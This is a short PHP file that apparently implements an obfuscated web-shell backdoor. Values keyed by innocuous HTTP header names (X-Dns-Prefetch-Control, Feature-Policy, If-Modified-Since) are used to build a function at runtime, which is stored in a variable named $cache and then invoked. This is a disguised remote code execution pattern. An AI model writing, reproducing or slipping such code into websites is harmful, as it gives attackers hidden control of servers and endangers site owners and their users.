<?php
$_HEADERS = Array();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $cache = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));
    $cache();
}